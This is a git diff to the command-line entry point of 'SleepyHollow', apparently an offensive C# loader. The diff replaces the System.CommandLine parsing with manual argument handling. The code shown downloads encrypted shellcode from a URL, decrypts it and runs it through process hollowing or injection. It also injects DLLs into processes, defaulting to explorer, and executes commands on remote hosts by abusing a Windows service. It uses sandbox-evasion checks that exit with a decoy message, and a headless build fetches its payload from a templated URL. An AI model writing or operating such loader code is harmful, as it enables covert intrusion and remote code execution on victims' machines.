@@ -1,100 +1,103 @@
 using SleepyHollow;
 
 #if !HEADLESS
-using System.CommandLine;
-
-var payloadArgument = new Argument<string>(
-    name: "URL/path to payload",
-    description: "The file to download and execute"
-);
-
-var methodOption = new Option<string>(name: "--method", description: "Execution method").FromAmong(
-    "inject",
-    "hollow"
-);
-methodOption.AddAlias("-m");
-methodOption.SetDefaultValue("hollow");
-
-var waitOptions = new Option<int>(
-    name: "--wait",
-    description: "The number of seconds to wait after executing the payload"
-);
-waitOptions.AddAlias("-w");
-waitOptions.SetDefaultValue(0);
-
-var scCommand = new Command("sc", "Injects and runs shellcode")
+var commands = new Dictionary<string, Dictionary<string, string>>
 {
-    payloadArgument,
-    methodOption,
-    waitOptions
-};
-
-var dllName = new Argument<string>("path/URL to DLL", "The DLL to inject");
-var processName = new Argument<string>("processName", "The process to inject into");
-var dllCommand = new Command("dll", "Injects and runs DLL") { processName, dllName };
-
-var hostnameArg = new Argument<string>("hostname", "The hostname to connect to");
-var cmdArg = new Argument<string>("cmd", "The command to execute");
-var serviceNameOption = new Option<string>("--service", "The service to abuse");
-serviceNameOption.SetDefaultValue("SensorService");
-var rawCmdOption = new Option<bool>("--raw", "Execute the command without prepending cmd.exe /c");
-rawCmdOption.SetDefaultValue(false);
-
-var remoteExecCommand = new Command("rexec", "Executes a command on a remote host")
-{
-    hostnameArg,
-    cmdArg,
-    serviceNameOption,
-    rawCmdOption
-};
-
-var rootCommand = new RootCommand("SleepyHollow");
-var skipEvasionOption = new Option<bool>("--skip-evasion", "Do not perform sandbox evasion checks");
-var debugOption = new Option<bool>("--debug", "Enable debug logging");
-
-rootCommand.AddGlobalOption(skipEvasionOption);
-rootCommand.AddGlobalOption(debugOption);
-rootCommand.AddCommand(scCommand);
-rootCommand.AddCommand(dllCommand);
-rootCommand.AddCommand(remoteExecCommand);
-
-remoteExecCommand.SetHandler(
-    async (host, cmd, skipEvasion, debug, service, raw) =>
     {
-        RuntimeConfig.IsDebugEnabled = debug;
-        if (!skipEvasion && EvasionCheck.Detected)
+        "sc",
+        new Dictionary<string, string>
         {
-            Console.WriteLine("Have a nice day!");
-            Environment.Exit(0);
+            { "payload", "path/URL to shellcode" },
+            { "method", "hollow/inject" },
+            { "wait", "seconds to wait before exiting" }
         }
-
-        await RemoteExecution.Run(host, cmd, serviceName: service, rawCmd: raw);
     },
-    hostnameArg,
-    cmdArg,
-    skipEvasionOption,
-    debugOption,
-    serviceNameOption,
-    rawCmdOption
-);
-
-scCommand.SetHandler(
-    async (url, method, skipEvasion, debug, wait) =>
     {
-        RuntimeConfig.IsDebugEnabled = debug;
-        if (!skipEvasion && EvasionCheck.Detected)
+        "dll",
+        new Dictionary<string, string>
         {
-            Console.WriteLine("Have a nice day!");
-            Environment.Exit(0);
+            { "path", "path/URL to DLL" },
+            { "processName", "process to inject into" }
         }
-        if (debug)
+    },
+    {
+        "rexec",
+        new Dictionary<string, string>
+        {
+            { "hostname", "hostname to connect to" },
+            { "cmd", "command to execute" },
+            { "service", "service to abuse" },
+            { "raw", "execute command without prepending cmd.exe /c" }
+        }
+    }
+};
+var globalSwitches = new Dictionary<string, string>
+{
+    { "--skip-evasion", "do not perform sandbox evasion checks" },
+    { "--debug", "enable debug logging" }
+};
+
+if (args.Length == 0)
+{
+    Console.WriteLine("Usage: SleepyHollow.exe <command> [options]");
+    Console.WriteLine("Commands:");
+    foreach (var cmd in commands)
+    {
+        Console.WriteLine($"  {cmd.Key}");
+        foreach (var opt in cmd.Value)
+        {
+            Console.WriteLine($"    --{opt.Key}: {opt.Value}");
+        }
+    }
+    Environment.Exit(0);
+}
+
+var command = args[0].ToLowerInvariant();
+var options = new Dictionary<string, string> { { "command", command } };
+
+for (var i = 0; i < args.Length; i++)
+{
+    var validArgs = commands[command];
+    var arg = args[i];
+    if (arg.StartsWith("--"))
+    {
+        arg = arg.Replace("--", "").ToLowerInvariant();
+        if (validArgs.ContainsKey(arg))
+        {
+            options[arg] = args[i + 1];
+        }
+        else if (globalSwitches.ContainsKey(arg))
+        {
+            options[arg] = "true";
+        }
+    }
+}
+
+var debugEnabled = options.ContainsKey("debug") && options["debug"] == "true";
+var skipEvasion = options.ContainsKey("skip-evasion") && options["skip-evasion"] == "true";
+
+RuntimeConfig.IsDebugEnabled = debugEnabled;
+if (!skipEvasion && EvasionCheck.Detected)
+{
+    Console.WriteLine("Have a nice day!");
+    Environment.Exit(0);
+}
+
+switch (options["command"])
+{
+    case "sc":
+        var url = options["payload"];
+        var method = options.ContainsKey("method") ? options["method"] : "hollow";
+        var wait = options.ContainsKey("wait") ? int.Parse(options["wait"]) : 0;
+
+        if (debugEnabled)
             Console.WriteLine($"Downloading {url}...");
         var httpClient = new HttpClient();
         var data = await httpClient.GetStringAsync(url);
-        if (debug)
+        if (debugEnabled)
             Console.WriteLine($"Downloaded {data.Length} bytes");
         var buf = Decoder.DecodeString(data);
-        if (debug)
+        if (debugEnabled)
             Console.WriteLine($"Decrypted payload to {buf.Length} bytes");
         var inject = method?.Equals("inject", StringComparison.OrdinalIgnoreCase) ?? false;
         if (inject)
@@ -102,67 +105,43 @@ scCommand.SetHandler(
         else
             await HollowProcess.Run(buf);
         await Task.Delay(wait * 1000);
-    },
-    payloadArgument,
-    methodOption,
-    skipEvasionOption,
-    debugOption,
-    waitOptions
-);
-
-dllCommand.SetHandler(
-    async (processName, dllName, skipEvasion, debug) =>
-    {
-        RuntimeConfig.IsDebugEnabled = debug;
-        if (!skipEvasion && EvasionCheck.Detected)
-        {
-            Console.WriteLine("Have a nice day!");
-            Environment.Exit(0);
-        }
-
+        break;
+    case "dll":
+        var dllName = options["path"];
+        var processName =  options.ContainsKey("processName") ? options["processName"] : "explorer";
         await InjectDLL.Run(dllName, processName);
-    },
-    processName,
-    dllName,
-    skipEvasionOption,
-    debugOption
-);
+        break;
+    case "rexec":
+        var host = options["hostname"];
+        var cmd = options["cmd"];
+        var service = options.ContainsKey("service") ? options["service"] : "SensorService";
+        var raw = options.ContainsKey("raw") && options["raw"] == "true";
+        await RemoteExecution.Run(host, cmd, serviceName: service, rawCmd: raw);
+        break;
+    default:
+        Console.WriteLine($"Unknown command {options["command"]}");
+        break;
+}
 
-await rootCommand.InvokeAsync(args);
 #endif
 
 #if HEADLESS
 #if DISABLE_EVASION
-        if(EvasionCheck.Detected)
-        {
-            Console.WriteLine("Have a nice day!");
-            Environment.Exit(0);
-        };
+if (EvasionCheck.Detected)
+{
+    Console.WriteLine("Have a nice day!");
+    Environment.Exit(0);
+}
+;
 #endif
-        var httpClient = new HttpClient();
-        var data = await httpClient.GetStringAsync("<%URL%>");
-        var buf = Decoder.DecodeString(data);
+var httpClient = new HttpClient();
+var data = await httpClient.GetStringAsync("<%URL%>");
+var buf = Decoder.DecodeString(data);
 #if INJECT
-        await InjectProcess.Run(buf);
+await InjectProcess.Run(buf);
 #else
-        await HollowProcess.Run(buf);
+await HollowProcess.Run(buf);
 #endif
 #endif
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
